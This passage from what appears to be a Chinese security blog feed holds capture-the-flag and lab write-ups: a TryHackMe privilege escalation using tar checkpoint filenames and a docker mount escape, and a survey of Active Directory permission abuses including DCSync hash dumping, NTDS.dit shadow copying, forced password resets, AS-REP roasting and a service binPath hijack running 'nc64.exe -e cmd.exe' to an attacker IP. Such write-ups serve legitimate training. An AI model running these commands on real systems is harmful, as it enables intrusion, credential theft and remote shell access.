src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164213325-995265159.png" alt="image-20241017164201069"></p><p>在当前目录找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>经典<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164349253-2140029166.png" alt="image-20241017164336681"></p><p>发现我们可以不使用密码以michael的身份运行<code>/opt/backups/backup.sh</code>，查看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164623416-1133329500.png" alt="image-20241017164611144"></p><p>这是一个压缩备份当前目录下的所有文件的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /opt/backups/backup.tar *</span><br></pre></td></tr></table></figure><p>可以用tar进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/sh</span><br></pre></td></tr></table></figure><p><code>/dev/null</code> 特殊的路径，写入该文件的数据都会被丢弃，但脚本中已经定义了路径所以我们不用管</p><p><code>--checkpoint=1</code> 在归档过程中每处理一个文件时，生成一个检查点。这个选项通常用于长时间运行的 tar 操作。</p><p><code>--checkpoint-action=exec=/bin/sh</code> 在每个检查点触发时执行指定的命令。这里指定的命令是 <code>/bin/sh</code>，即启动一个新的 shell。</p><p>只要能够让<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh</code>运行起来就行了，那么我们只用创建两个名为<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh</code>的文件就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; --checkpoint=1</span><br><span class="line"><span class="built_in">chmod</span> 777 backup.tar</span><br><span class="line">sudo -u michael /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183620069-1667799123.png" alt="image-20241017183604622"></p><p>需要注意的是要将<code>backup.tar</code>权限设置成能允许其他用户可以访问的权限</p><p>现在就移动到<code>michael</code>权限</p><h2 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h2><p><code>id</code>看下权限先</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183927283-989168472.png" alt="image-20241017183913322"></p><p>发现有个docker权限</p><p>利用docker提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --<span class="built_in">rm</span> -it alpine <span class="built_in">chroot</span> /mnt sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184042987-2077176883.png" alt="image-20241017184029556"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184117724-885437577.png" alt="image-20241017184104249"></p><p>在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之The Marketplace</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>域渗透中可滥用权限及其应用</title>
    <link href="https://ya1orin.github.io/posts/32b1aa46.html"/>
    <id>https://ya1orin.github.io/posts/32b1aa46.html</id>
    <published>2024-10-16T12:21:52.000Z</published>
    <updated>2024-11-03T10:19:21.645Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="滥用writeDACL-权限实现权限提升"><a href="#滥用writeDACL-权限实现权限提升" class="headerlink" title="滥用writeDACL 权限实现权限提升"></a>滥用writeDACL 权限实现权限提升</h1><p>简介：在域环境中，如果安装Exchange后，系统会添加一个名为Microsoft Exchange Security Groups、Exchange Trusted Subsystem和Exchange Windows Permission三个组。如果获得了这三个组内任意用户的控制权限，就能够继承用户组的WriteDACL权限，WriteDACL权限可以修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash，实现权限提升的目的。</p><p><strong>实际应用场景：</strong></p><p>通过在BloodHound中搜索“svc-alfresco”用户，我发现实际上该用户属于 Account Operators 组，该组是AD中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。但是，不能更改属于Administrators或Domain Admins组的账号，也不能更改这些组。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476652454-cbd90151-2f5d-44d4-b511-936ce92fa7fd.png" alt="img"></p><p>通过下图我们可以看到从 svc-alfresco 到 Domain Admins 的路径，我们在下图中的发现exchange windows permission组完全信任Account Operators 组，因此我们可以利用Account Operators 组的权限创建一个新用户，然后把他添加到exchange windows permission组，这样我们就可以对HTB.LOCAL进行一些操作了，我们看到exchange windows permission组的成员对htb.local用有writeDACL权限， 然后我们可以利用我们新添加的用户对HTB.LOCAL的 writeDACL权限进行恶意利用，进而实现权限提升，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476675522-224d3254-95d2-49a7-a15e-6b34a99efc6d.png" alt="img"></p><p>默认情况下，Exchange Windows Permissions安全组对安装 Exchange 的域的域对象具有 writeDACL 权限。</p><p>writeDACL 权限允许身份修改指定对象的权限（换句话说：修改 ACL），这意味着通过成为组织管理组的成员，我们能够将权限提升到域管理员的权限。<br>为了利用这一点，我们将新创建的用户帐户添加到该Exchange Windows Permission组中。Exchange Windows Permission组的成员，这允许我们修改HTB.LOCAL域的 ACL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user popayw 123abc! /add /domain# 创建用户</span><br><span class="line">net group    #该命令的结果中找到了Exchange Windows Permissions组</span><br><span class="line">net group &quot;Exchange Windows Permissions&quot; popayw /add# 将用户添加到Exchange Windows Permissions组</span><br><span class="line">net localgroup #在该命令的结果中发现了Remote Management Users组</span><br><span class="line">net localgroup &#x27;Remote Management Users&#x27; popayw  /add</span><br></pre></td></tr></table></figure><p>如果我们有权修改 AD 对象的 ACL，则可以将权限分配给允许他们写入特定属性（例如包含电话号码的属性）的身份。除了为这些属性分配读/写权限外，还可以为扩展权限分配权限。这些权限是预定义的任务，例如更改密码、向邮箱发送电子邮件等权限2。通过应用以下扩展权限，还可以将任何给定帐户添加为域的复制伙伴：</p><ul><li>复制目录更改（DS-Replication-Get-Changes）</li><li>全部复制目录更改 (DS-Replication-Get-Changes-All )</li></ul><p>当我们为我们的用户帐户设置这些权限时，我们能够请求域中任何用户的密码哈希，那么具体如何获取的呢？</p><h1 id="DCsync攻击"><a href="#DCsync攻击" class="headerlink" title="DCsync攻击"></a><strong>DCsync攻击</strong></h1><ul><li>DCSync攻击原理</li></ul><p><strong>主要利用的是域控制器之间的数据同步复制</strong></p><p>当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p><p>用户想要发起<code>DCSync</code>攻击，必须获得以下任一用户的权限</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>之前我们已经创建了一个有<code>DCSync</code>权限的用户，我们可以使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>secretsdump.py popayw:<span class="string">&#x27;123abc!&#x27;</span>@<span class="number">10.10</span>.<span class="number">10.161</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474277130-8a9b1f9b-9cf6-4513-8c72-d88025f31177.png" alt="img"></p><p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p><h1 id="滥用SeBackupPrivilege权限进行NTDS-dt卷影拷贝实现权限提升"><a href="#滥用SeBackupPrivilege权限进行NTDS-dt卷影拷贝实现权限提升" class="headerlink" title="滥用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升"></a>滥用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升</h1><p>简介：SeBackupPrivilege权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。 启用了 SeBackupPrivilege 的调用，方无需任何基于 ACL 的安全检查，我们可以借助该权限进行NTDS.dt卷影拷贝最终实现权限提升。</p><p><strong>实际应用场景：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击的步骤大概分三步</span><br><span class="line">- 获取文件副本，`NTDS.dit`即存储 Active Directory 用户凭据的数据库。</span><br><span class="line">- 接下来，我们将获取 SYSTEM hive 文件，其中包含解密 NTDS.dit 所必需的系统启动密钥</span><br><span class="line">- 使用 Impacket 的 secretsdump 脚本从 NTDS.dit 中提取域中所有用户的 NTLM 哈希</span><br></pre></td></tr></table></figure><p>假如我们现在拿到了一个svc_backup用户的hash，然后我们开始使用evil-winrm尝试进行远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</span><br></pre></td></tr></table></figure><p>通过我们之前导入的bloodhound的分析结果，我们得知该用户属于backup_operators组的成员</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474582386-8f350409-cffc-49f0-a6c6-459226ce5b50.png" alt="img"></p><p>因此该用户也很有可能是启用SEBackupPrivilege 权限的用户。我们执行如下命令，看一下其是否有该权限</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474710566-e486b9ce-7659-4bb5-9a5f-7df982f8b3a7.png" alt="img"></p><p>此时我们知道了我们拥有SEBackupPrivilege 权限，所以我们可以通过使用签名的二进制文件创建 NTDS.dit 的卷影副本来完成diskshadow 首先，创建一个名为 cmd.txt 的文本文件，其中包含以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters#</span><br><span class="line">add volume c: alias new1#</span><br><span class="line">set metadata c:\windows\system32\spool\drivers\color\example.cab # 添加的部分</span><br><span class="line">create#</span><br><span class="line">expose %new1% z:#</span><br></pre></td></tr></table></figure><p><a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">参考链接</a></p><p>然后执行diskshadow 并使用脚本文件作为其输入，接着我们可以使用这个<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474999442-6b1f0738-c080-4c36-a78a-7c74126646f5.png" alt="img"></p><p>将备份<code>ntds.dit</code>文件移动到当前文件夹</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475051343-dfa3b6e4-ed37-49b2-8a89-7d8b8a56c93f.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475071949-2357f008-5615-4c3e-9359-1fdf1131d018.png" alt="img"></p><p>从注册表中获取<code>system.hive</code>文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475094698-b226e8d3-c6f3-42b8-b977-2b493b7108fb.png" alt="img"></p><p>使用使用<code>secretsdump.py</code> 解析 <code>NTDS.dit</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475182029-fb8f0bee-8505-40ec-a0b9-03975d9f8a92.png" alt="img"></p><h1 id="滥用ForceChangePassword权限实现横向移动"><a href="#滥用ForceChangePassword权限实现横向移动" class="headerlink" title="滥用ForceChangePassword权限实现横向移动"></a>滥用ForceChangePassword权限实现横向移动</h1><p>简介： ForceChangePassword:强制更改密码,在不知道当前密码的情况下更改目标用户的密码。</p><p><strong>实际应用场景：</strong></p><p>我们在bloodhound可以看到support用户对AUDIT用户具有ForceChangePassword权限，顾名思义，就是<code>support</code>用户可以修改<code>audit2020</code>用户的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474359846-8e391f96-fd25-4058-85c8-a9d9cb4c62bf.png" alt="img"></p><p>尝试利用<code>rpcclient</code>修改<code>audit2020</code>用户的密码</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">rpcclient</span> -<span class="type">U</span> sup<span class="keyword">port</span> <span class="comment">--password=&#x27;#00^BlackKnight&#x27; //10.10.10.192</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410545-68568a43-0b82-47a6-b1a6-b1622f313551.png" alt="img"></p><p>修改密码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;test&#x27;</span></span><br></pre></td></tr></table></figure><p>其中<code>23</code>表示用户信息级别为设置用户密码的级别</p><p>当设置的新密码与密码策略不匹配时会返回，设置一个复杂度比较高的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410762-e611b9c2-f7f9-47cd-97bf-79a2e6529afe.png" alt="img"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410695-e764bb99-4163-4b61-8096-2adfac47c699.png" alt="img"></p><p>利用<code>crackmapexec</code>验证一下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crackmapexec</span> smb <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410789-3eeb3d55-f904-497e-920e-ea8f6f2c9a56.png" alt="img"></p><p>尝试通过<code>audit2020</code>用户去获得更多<code>smb</code>共享目录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474459320-bffb8374-1d2d-4a93-829a-585dbbd01e8a.png" alt="img"><br> 相比于之前的那个用户，我们获得了目录forensic的访问权限，可以进行进一步的信息搜集，或者利用该用户的权限来进行一些原本无法实现的操作。</p><h1 id="滥用DNS-Admin组权限实现权限提升"><a href="#滥用DNS-Admin组权限实现权限提升" class="headerlink" title="滥用DNS Admin组权限实现权限提升"></a>滥用DNS Admin组权限实现权限提升</h1><p>简介：当我们有权访问恰好是 DNSAdmins 组成员的用户帐户时，或者当受感染的用户帐户对 DNS 服务器对象具有写入权限时，我们可以滥用他的成员资格从而升级为管理员权限。简单来讲，DNSAdmins 组的成员可以访问网络 DNS 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。默认情况下，DNSAdmins 没有启动或停止 DNS 服务的能力，但管理员授予该组成员该权限并不罕见，当dnsadmins 组的成员被授予该权限时可用于通过 dll 注入将权限提升到管理员。</p><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">参考链接</a></p><p><strong>实际应用场景：</strong></p><p>我们发现ryan用户是DNSAdmins 组的成员</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475243149-3c4322d0-7ee2-4757-a692-32e1ce657827.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475252762-af3b7dd7-a0a3-439c-a11e-db618de2dda6.png" alt="img"></p><p>发现<code>ryan</code>用户属于<code>contractors</code>组，而<code>contractors</code>组又属于<code>dnsadmins</code>组，所以<code>ryan</code>用户属于<code>dnsadmins</code>组</p><p>就可以利用 <code>DnsAdmins</code>权限进行<code>AD</code>域提权</p><p>在目标上，我们可以更改 dns 的配置，因为用户 ryan 属于dnsadmins组。我们还可以启动和停止 dns 服务。</p><p>首先我们可以使用 msfvenom 生成我们的有效负载 dll，然后启动smb服务</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475429673-387fa037-6643-4f57-a4b7-9ec4a03c6f46.png" alt="img"></p><p>因为正常<code>upload</code>传文件会被杀掉，这里考虑使用<code>smb</code>传文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475452509-72be61e3-8633-403d-b13c-4af30b38242b.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475472509-3bb24eb0-058d-4dd0-a356-b481a1837b7a.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475500613-a48af79f-d61b-4f3f-a486-0fed00f873cd.png" alt="img"></p><p>此时，之前利用<code>python</code>起的<code>smbserver</code>服务会收到回显</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475513971-bf7ec014-3dde-4ea8-b0d9-e76bc3e3ecd7.png" alt="img"></p><h1 id="滥用AD-Recycle-Bin权限实现权限提升"><a href="#滥用AD-Recycle-Bin权限实现权限提升" class="headerlink" title="滥用AD Recycle Bin权限实现权限提升"></a>滥用AD Recycle Bin权限实现权限提升</h1><p><strong>简介：</strong><code>AD Recycle Bin</code>是一个著名的 Windows 组。<a href="https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/">Active Directory 对象恢复（或回收站）</a>是 Server 2008 中添加的一项功能，允许管理员恢复已删除的项目，就像回收站对文件所做的一样。在 Windows Server 2012 之前，从 AD 回收站还原对象需要使用 LDAP 工具或 PowerShell 列出所有已删除的对象，筛选一长串对象以找到所需的对象，然后使用另一个 PowerShell 命令来还原它。</p><p><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">参考链接</a></p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了arksvc用户的shell，我们之前还找到了一个旧电子邮件，在该邮件中提到临时管理员帐户TempAdmin使用了与正常管理员帐户相同的密码（密码复用）。</p><p>通过使用以下命令我们可以查看当前用户的所属组</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475837278-8d50a4a2-e1df-4627-ac9d-f48bf6575c13.png" alt="img"></p><p>发现该用户属于 <code>AD Recycle Bin</code> 组下</p><p>我们可以使用以下命令来列出所有已删除的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27; -includeDeletedObjects</span><br></pre></td></tr></table></figure><p>最后一条比较有意思，我们发现了前面提到的临时用户<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475859325-8779824d-b8cc-4b0d-a80b-e5b2856edb2f.png" alt="img"></p><p>我们可以使用以下命令来获得该帐户的所有详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#123; SAMAccountName -eq &quot;TempAdmin&quot; &#125; -includeDeletedObjects -property *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475880391-e2411730-f329-425e-97d8-20698e5532fc.png" alt="img"></p><p>在该用户的详细信息中，我们发现了该用户的密码，尝试解密后成功得到了TempAdmin用户的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475890680-ac1aece6-3118-4631-b56d-4e3d66390fd2.png" alt="img"></p><h1 id="滥用GenericWrite权限实现横向移动"><a href="#滥用GenericWrite权限实现横向移动" class="headerlink" title="滥用GenericWrite权限实现横向移动"></a>滥用GenericWrite权限实现横向移动</h1><p>简介：GenericWrite权限也就是通用写访问权限，该权限授予你写入目标对象上任何不受保护的属性的能力，包括组的“成员”和用户的“服务主体名称”。</p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了用户sbauer的shell，这里我们尝试使用Blooodhound进行信息搜集</p><p>我们将bloodhound生成的json文件导入bloodhound分析，发现当前用户对JORDEN用户具有通用写权限，而JORDEN用户属于SERVER_OPERATORS组（高权限组）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476044125-d4e5a90e-0eef-4ba9-8b65-0b649b2ba734.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476048485-acb32246-5fac-4f8a-a765-f008c9ac1260.png" alt="img"></p><p>这里我们说一下 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos 预身份验证”属性的用户检索密码哈希的技术。如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。</p><p>我们可以使用下面这条命令来为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true</span><br></pre></td></tr></table></figure><p>然后我们可以使用impactet下的GetNPUsers脚本来获取jorden用户的AS-rep票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476143216-698c4f6a-f388-42dd-a82a-2ee98e260bef.png" alt="img"></p><p>我们把获取到的票据放到hash文件中，然后使用john尝试破解获取其明文密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476176979-31d3745a-67a1-4f4a-ad78-6dd2636610aa.png" alt="img"></p><h1 id="滥用Server-Operators组权限实现权限提升"><a href="#滥用Server-Operators组权限实现权限提升" class="headerlink" title="滥用Server Operators组权限实现权限提升"></a>滥用Server Operators组权限实现权限提升</h1><p>简介：Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。</p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了用户jorden的shell，默认情况下，该组具备启动和停止服务的能力，并且该用户可以编辑任何服务。</p><p>所以这里使用服务路径劫持的方式来获得系统权限，首先上传<code>nc64.exe</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476259349-579d5f77-1f83-4c0f-a10f-0b79ba25a3f7.png" alt="img"></p><p>经过多次测试后发现可以改变<code>browser</code>服务的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476289851-b941cc82-2cac-4397-aa64-28836741e29c.png" alt="img"></p><p>kali中监听</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476314438-071e3dff-f44c-4642-af3f-468f24b3703c.png" alt="img"></p><p>然后在靶机中手动重启<code>browser</code>服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sc.exe </span>stop <span class="keyword">browser</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sc.exe </span>start <span class="keyword">browser</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476328205-93ec8e94-e4e1-4ebd-816a-7906abdb834f.png" alt="img"></p><p>kali回显</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476340802-ebdc5e40-2d33-4ba0-9c94-a4bc88d719c6.png" alt="img"></p><h1 id="滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取"><a href="#滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取" class="headerlink" title="滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取"></a>滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取</h1><p>简介：SeBackupPrivilege权限：可以用来实现备份操作，对当前系统任意文件具有读权限 。 SeRestorePrivilege权限：该权限被描述为“需要执行恢复操作”，并导致系统将所有写访问控制权授予任何系统上的文件，而不考虑文件 ACL。 此外，该特权允许持有进程或线程更改所有者文件,因此获得此特权的含义应该是显而易见的。</p><p><strong>实际应用场景：</strong></p><p>通过使用<code>whoami /priv</code>命令发现该用户具有SeBackupPrivilege<code>和</code>SeRestorePrivilege权限</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476369509-5732c90f-3163-4206-a718-5a14af619fb9.png" alt="img"></p><p>有了SeBackupPrivilege和SeRestorePrivilege这两个权限，我就可以用<code>robocopy</code>来复制敏感文件并读取其内容，在实战环境下我们可以尝试读取其他的一些敏感文件。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476393196-787cc0bc-4227-40fa-a7a8-6042007fc928.png" alt="img"></p>]]></content>
    
    
    <summary type="html">域渗透中可滥用权限及其应用总结</summary>
    
    
    
    <category term="域渗透应用" scheme="https://ya1orin.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="权限提升" scheme="https://ya1orin.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="横向移动" scheme="https://ya1orin.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    
    <category term="权限滥用" scheme="https://ya1orin.github.io/tags/%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>THM-Mustacchio</title>
    <link href="https://ya1orin.github.io/posts/1b81dcb8.html"/>
    <id>https://ya1orin.github.io/posts/1b81dcb8.html</id>
    <published>2024-10-15T06:59:34.000Z</published>
    <updated>2024-11-13T05:19:30.592Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.235.246</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -T4 -A -sV -sC -p- 10.10.235.246</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 